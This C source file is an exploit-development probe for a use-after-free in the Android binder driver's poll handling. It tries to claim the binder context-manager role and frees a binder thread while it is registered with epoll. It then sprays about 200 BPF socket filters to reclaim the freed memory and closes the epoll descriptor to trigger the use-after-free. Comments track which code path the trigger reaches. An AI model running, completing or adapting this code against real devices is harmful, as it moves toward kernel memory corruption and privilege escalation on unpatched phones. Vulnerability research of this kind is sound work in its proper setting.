/*
 * binder_poll_probe.c — Verify which wait queue binder_poll uses
 *
 * KEY FINDING from disassembly:
 * binder_poll has two paths:
 *   1. wait_for_proc_work=TRUE → poll_wait(&proc->wait, pt) [SAFE]
 *   2. wait_for_proc_work=FALSE → poll_wait(&thread->wait, pt) [VULN]
 *
 * wait_for_proc_work = (transaction_stack==NULL && list_empty(todo) && 
 *                       return_error==BR_OK)
 *
 * For fresh thread: all TRUE → proc->wait path → NO UAF!
 * Need transaction_stack != NULL to get thread->wait path.
 *
 * This probe tests:
 * TEST A: Can we BINDER_SET_CONTEXT_MGR?
 * TEST B: Can we self-transaction (send + receive)?
 * TEST C: Verify poll_wait target by observing UAF behavior
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/epoll.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <linux/filter.h>

#define BINDER_WRITE_READ       0xc0306201
#define BINDER_SET_MAX_THREADS  0x40046205
#define BINDER_SET_CONTEXT_MGR  0x40046207
#define BINDER_THREAD_EXIT      0x40046208
#define BINDER_VERSION          0xc0046209

#define BC_TRANSACTION      0x40406300
#define BC_REPLY            0x40406301
#define BC_ENTER_LOOPER     0x0000630d
#define BC_EXIT_LOOPER      0x0000630e

#define BR_NOOP             0x0000720c
#define BR_TRANSACTION      0x40407202
#define BR_REPLY            0x40407203
#define BR_DEAD_REPLY       0x00007205
#define BR_FAILED_REPLY     0x00007211

#define TF_ONE_WAY          0x01

struct binder_write_read {
    signed long write_size;
    signed long write_consumed;
    unsigned long write_buffer;
    signed long read_size;
    signed long read_consumed;
    unsigned long read_buffer;
};

struct binder_transaction_data {
    union {
        uint32_t handle;
        void *ptr;
    } target;
    void *cookie;
    uint32_t code;
    uint32_t flags;
    int32_t sender_pid;
    int32_t sender_euid;
    uint32_t data_size;
    uint32_t offsets_size;
    union {
        struct {
            const void *buffer;
            const void *offsets;
        } ptr;
        uint8_t buf[8];
    } data;
};

/* TEST A: Try to become context manager */
static void test_context_mgr(void) {
    printf("--- TEST A: BINDER_SET_CONTEXT_MGR ---\n");
    int fd = open("/dev/binder", O_RDWR | O_CLOEXEC);
    if (fd < 0) { printf("  Can't open binder: %s\n", strerror(errno)); return; }

    void *map = mmap(NULL, 1024*1024, PROT_READ, MAP_PRIVATE, fd, 0);
    printf("  mmap: %s\n", map == MAP_FAILED ? strerror(errno) : "OK");

    int ctx = 0;
    int ret = ioctl(fd, BINDER_SET_CONTEXT_MGR, &ctx);
    printf("  BINDER_SET_CONTEXT_MGR: ret=%d errno=%d (%s)\n",
           ret, errno, ret < 0 ? strerror(errno) : "SUCCESS");

    if (ret == 0) {
        printf("  *** WE ARE CONTEXT MANAGER! ***\n");
    }

    if (map != MAP_FAILED) munmap(map, 1024*1024);
    close(fd);
}

/* Helper thread: sends a transaction to handle 0 (context manager) */
struct sender_args {
    int binder_fd;
    int done;
};

static void *sender_thread(void *arg) {
    struct sender_args *sa = (struct sender_args *)arg;

    /* Small delay to let receiver enter BINDER_WRITE_READ */
    usleep(50000);

    /* Open our own binder fd for sending */
    int sfd = open("/dev/binder", O_RDWR | O_CLOEXEC);
    if (sfd < 0) { sa->done = -1; return NULL; }

    void *smap = mmap(NULL, 128*1024, PROT_READ, MAP_PRIVATE, sfd, 0);
    if (smap == MAP_FAILED) { close(sfd); sa->done = -2; return NULL; }

    /* Send BC_TRANSACTION to handle 0 (context manager) with TF_ONE_WAY */
    uint8_t wbuf[256];
    memset(wbuf, 0, sizeof(wbuf));
    uint32_t *wp = (uint32_t *)wbuf;
    *wp++ = BC_TRANSACTION;
    struct binder_transaction_data *tr = (struct binder_transaction_data *)wp;
    tr->target.handle = 0;  /* context manager */
    tr->code = 1;           /* arbitrary */
    tr->flags = TF_ONE_WAY; /* one-way so sender doesn't block */
    tr->data_size = 4;
    tr->offsets_size = 0;
    /* Simple data: just 4 bytes */
    uint32_t txn_data = 0x42424242;
    tr->data.ptr.buffer = (void *)&txn_data;
    tr->data.ptr.offsets = NULL;
    wp = (uint32_t *)((char *)tr + sizeof(*tr));

    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_buffer = (unsigned long)wbuf;
    bwr.write_size = (char *)wp - (char *)wbuf;

    int ret = ioctl(sfd, BINDER_WRITE_READ, &bwr);
    printf("  Sender: write_read ret=%d write_consumed=%ld\n",
           ret, bwr.write_consumed);

    munmap(smap, 128*1024);
    close(sfd);
    sa->done = 1;
    return NULL;
}

/* TEST B: Self-transaction if we're context manager */
static void test_self_transaction(void) {
    printf("\n--- TEST B: Self-transaction (requires context manager) ---\n");

    /* Open binder as receiver (context manager) */
    int rfd = open("/dev/binder", O_RDWR | O_CLOEXEC);
    if (rfd < 0) { printf("  Can't open binder\n"); return; }

    void *rmap = mmap(NULL, 1024*1024, PROT_READ, MAP_PRIVATE, rfd, 0);
    if (rmap == MAP_FAILED) { printf("  mmap failed\n"); close(rfd); return; }

    /* Try to become context manager */
    int ctx = 0;
    if (ioctl(rfd, BINDER_SET_CONTEXT_MGR, &ctx) < 0) {
        printf("  Cannot become context manager: %s\n", strerror(errno));
        printf("  (servicemanager already registered)\n");
        munmap(rmap, 1024*1024);
        close(rfd);
        return;
    }
    printf("  Became context manager!\n");

    /* Enter looper on receiver fd */
    uint8_t enter_buf[4];
    *(uint32_t *)enter_buf = BC_ENTER_LOOPER;
    struct binder_write_read enter_bwr;
    memset(&enter_bwr, 0, sizeof(enter_bwr));
    enter_bwr.write_buffer = (unsigned long)enter_buf;
    enter_bwr.write_size = 4;
    ioctl(rfd, BINDER_WRITE_READ, &enter_bwr);

    /* Launch sender thread */
    struct sender_args sa = { .binder_fd = rfd, .done = 0 };
    pthread_t tid;
    pthread_create(&tid, NULL, sender_thread, &sa);

    /* Read incoming transaction */
    uint8_t rbuf[256];
    struct binder_write_read rbwr;
    memset(&rbwr, 0, sizeof(rbwr));
    rbwr.read_buffer = (unsigned long)rbuf;
    rbwr.read_size = sizeof(rbuf);

    alarm(5); /* timeout */
    int ret = ioctl(rfd, BINDER_WRITE_READ, &rbwr);
    alarm(0);
    printf("  Receiver: read ret=%d read_consumed=%ld\n",
           ret, rbwr.read_consumed);

    if (rbwr.read_consumed >= 4) {
        uint32_t cmd = *(uint32_t *)rbuf;
        printf("  Received cmd: 0x%08x", cmd);
        if (cmd == BR_TRANSACTION) printf(" (BR_TRANSACTION!)");
        else if (cmd == BR_NOOP) printf(" (BR_NOOP)");
        printf("\n");

        if (cmd == BR_TRANSACTION) {
            printf("  *** TRANSACTION RECEIVED → transaction_stack should be set! ***\n");

            /* NOW: epoll_ctl should use thread->wait path */
            int epfd = epoll_create1(O_CLOEXEC);
            struct epoll_event ev = { .events = EPOLLIN };
            epoll_ctl(epfd, EPOLL_CTL_ADD, rfd, &ev);

            /* Free the thread */
            int thr = 0;
            ioctl(rfd, BINDER_THREAD_EXIT, &thr);

            /* Spray BPF filters (26 insns → k256) */
            int spray_fds[200];
            int ns = 0;
            for (int i = 0; i < 200; i++) {
                spray_fds[i] = socket(AF_INET, SOCK_DGRAM, 0);
                if (spray_fds[i] < 0) break;
                ns++;
            }
            struct sock_filter insns[26];
            memset(insns, 0, sizeof(insns));
            for (int j = 0; j < 25; j++) {
                insns[j].code = 0x00; /* LD_IMM → internal code 30 */
                insns[j].k = 0xDEAD0000 + j;
            }
            insns[25].code = 0x06; insns[25].k = 0xFFFF;
            struct sock_fprog prog = { .len = 26, .filter = insns };
            int attached = 0;
            for (int i = 0; i < ns; i++) {
                if (setsockopt(spray_fds[i], SOL_SOCKET, SO_ATTACH_FILTER,
                               &prog, sizeof(prog)) == 0)
                    attached++;
            }
            printf("  Sprayed %d BPF filters (k256)\n", attached);

            /* Trigger UAF — THIS SHOULD HANG if reclaimed! */
            printf("  Closing epfd (UAF trigger)...\n");
            close(epfd);
            printf("  close(epfd) returned! (no hang = no reclaim or proc->wait path)\n");

            for (int i = 0; i < ns; i++) close(spray_fds[i]);
        }
    }

    pthread_join(tid, NULL);
    munmap(rmap, 1024*1024);
    close(rfd);
}

/* TEST C: Direct verification - is NEED_RETURN set when binder_poll first runs? */
static void test_need_return(void) {
    printf("\n--- TEST C: NEED_RETURN state check ---\n");

    /* Approach: open binder, do NOT ioctl (so NEED_RETURN stays set from get_thread)
     * Then epoll_ctl → binder_poll creates thread with NEED_RETURN
     * NEED_RETURN → binder_has_thread_work = TRUE → returns POLLIN immediately
     * → no poll_wait called → close(epfd) is safe
     *
     * Then: open binder, DO ioctl (clears NEED_RETURN)
     * Then epoll_ctl → binder_poll → NEED_RETURN cleared
     * → wait_for_proc_work check (all TRUE for fresh thread) → proc->wait
     * → close(epfd) removes from proc->wait → safe (proc alive)
     */
    printf("  Sub-test 1: epoll_ctl WITHOUT prior ioctl (NEED_RETURN set)\n");
    for (int i = 0; i < 10; i++) {
        pid_t pid = fork();
        if (pid == 0) {
            alarm(3);
            int fd = open("/dev/binder", O_RDWR | O_CLOEXEC);
            /* NO ioctl — thread created by binder_poll with NEED_RETURN */
            int epfd = epoll_create1(O_CLOEXEC);
            struct epoll_event ev = { .events = EPOLLIN };
            epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &ev);
            int t = 0; ioctl(fd, BINDER_THREAD_EXIT, &t);
            close(epfd);
            _exit(0);
        }
        int status;
        waitpid(pid, &status, 0);
    }
    printf("  10/10 completed (NEED_RETURN → POLLIN → no poll_wait)\n");

    printf("  Sub-test 2: epoll_ctl WITH prior ioctl (NEED_RETURN cleared)\n");
    for (int i = 0; i < 10; i++) {
        pid_t pid = fork();
        if (pid == 0) {
            alarm(3);
            int fd = open("/dev/binder", O_RDWR | O_CLOEXEC);
            uint32_t mx = 0;
            ioctl(fd, BINDER_SET_MAX_THREADS, &mx); /* clears NEED_RETURN */
            int epfd = epoll_create1(O_CLOEXEC);
            struct epoll_event ev = { .events = EPOLLIN };
            epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &ev);
            int t = 0; ioctl(fd, BINDER_THREAD_EXIT, &t);
            /* BPF spray to try reclaim */
            int sfd = socket(AF_INET, SOCK_DGRAM, 0);
            struct sock_filter ins[26];
            memset(ins, 0, sizeof(ins));
            for (int j = 0; j < 25; j++) ins[j].code = 0x00;
            ins[25].code = 0x06; ins[25].k = 0xFFFF;
            struct sock_fprog prog = { .len = 26, .filter = ins };
            setsockopt(sfd, SOL_SOCKET, SO_ATTACH_FILTER, &prog, sizeof(prog));
            close(epfd); /* should be safe if using proc->wait */
            close(sfd);
            _exit(0);
        }
        int status;
        waitpid(pid, &status, 0);
    }
    printf("  10/10 completed (fresh thread → proc->wait → safe)\n");

    /* TEST C3: What if the FIRST ioctl is BINDER_THREAD_EXIT? */
    printf("  Sub-test 3: BINDER_THREAD_EXIT as first ioctl\n");
    for (int i = 0; i < 10; i++) {
        pid_t pid = fork();
        if (pid == 0) {
            alarm(3);
            int fd = open("/dev/binder", O_RDWR | O_CLOEXEC);
            /* First ioctl is THREAD_EXIT → creates thread, frees it in one call */
            int t = 0; ioctl(fd, BINDER_THREAD_EXIT, &t);
            /* Thread is freed, but what about NEED_RETURN clearing at end of ioctl?
             * binder_ioctl does: thread->looper &= ~NEED_RETURN at done: label
             * But thread is NULL after THREAD_EXIT (set to NULL)
             * So the clearing is SKIPPED! */
            _exit(0);
        }
        int status;
        waitpid(pid, &status, 0);
    }
    printf("  10/10 completed\n");

    /* TEST C4: What if we do BINDER_THREAD_EXIT *during* epoll? 
     * Open binder, ioctl to clear NEED_RETURN, then try to set up
     * a situation where transaction_stack is non-NULL */
    printf("  Sub-test 4: Check binder version and features\n");
    int fd = open("/dev/binder", O_RDWR | O_CLOEXEC);
    int ver = 0;
    if (ioctl(fd, BINDER_VERSION, &ver) == 0) {
        printf("  Binder protocol version: %d\n", ver);
    }
    close(fd);
}

/* TEST D: Try servicemanager registration */
static void test_service_registration(void) {
    printf("\n--- TEST D: Servicemanager transaction ---\n");

    int fd = open("/dev/binder", O_RDWR | O_CLOEXEC);
    if (fd < 0) { printf("  Can't open binder\n"); return; }

    void *map = mmap(NULL, 256*1024, PROT_READ, MAP_PRIVATE, fd, 0);
    if (map == MAP_FAILED) { printf("  mmap failed: %s\n", strerror(errno)); close(fd); return; }

    /* Send a simple transaction to handle 0 (servicemanager) */
    /* This is a LIST_SERVICES call (code=3 in IServiceManager) */
    uint8_t wbuf[256];
    memset(wbuf, 0, sizeof(wbuf));
    uint32_t *wp = (uint32_t *)wbuf;

    *wp++ = BC_TRANSACTION;
    struct binder_transaction_data *tr = (struct binder_transaction_data *)wp;
    tr->target.handle = 0;
    tr->code = 1; /* CHECK_SERVICE_TRANSACTION = 1 */
    tr->flags = 0; /* synchronous! */
    /* Minimal parcel data: interface descriptor + service name */
    char parcel_data[128];
    memset(parcel_data, 0, sizeof(parcel_data));
    /* Write strict mode policy */
    *(int32_t *)parcel_data = 0; /* strict mode */
    /* Write interface string "android.os.IServiceManager" - skip for now, just test raw */
    tr->data_size = 4;
    tr->data.ptr.buffer = parcel_data;
    tr->data.ptr.offsets = NULL;
    tr->offsets_size = 0;
    wp = (uint32_t *)((char *)tr + sizeof(*tr));

    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_buffer = (unsigned long)wbuf;
    bwr.write_size = (char *)wp - (char *)wbuf;

    /* Also request to read the reply */
    uint8_t rbuf[256];
    bwr.read_buffer = (unsigned long)rbuf;
    bwr.read_size = sizeof(rbuf);

    alarm(5);
    int ret = ioctl(fd, BINDER_WRITE_READ, &bwr);
    alarm(0);
    printf("  Transaction to servicemanager: ret=%d errno=%d write_consumed=%ld read_consumed=%ld\n",
           ret, errno, bwr.write_consumed, bwr.read_consumed);

    if (bwr.read_consumed >= 4) {
        uint32_t reply_cmd = *(uint32_t *)rbuf;
        printf("  Reply cmd: 0x%08x", reply_cmd);
        if (reply_cmd == BR_REPLY) printf(" (BR_REPLY)");
        else if (reply_cmd == BR_DEAD_REPLY) printf(" (BR_DEAD_REPLY)");
        else if (reply_cmd == BR_FAILED_REPLY) printf(" (BR_FAILED_REPLY)");
        else if (reply_cmd == BR_NOOP) printf(" (BR_NOOP)");
        printf("\n");

        /* After this ioctl, our thread->transaction_stack was:
         * 1. Set when we sent BC_TRANSACTION (sender side)
         * 2. Cleared when we received the reply
         * So transaction_stack is NULL again. */
        printf("  (After reply: transaction_stack cleared)\n");
    }

    munmap(map, 256*1024);
    close(fd);
}

int main() {
    printf("=== Binder Poll Path Probe ===\n\n");

    test_context_mgr();
    test_self_transaction();
    test_need_return();
    test_service_registration();

    printf("\n=== Done ===\n");
    return 0;
}
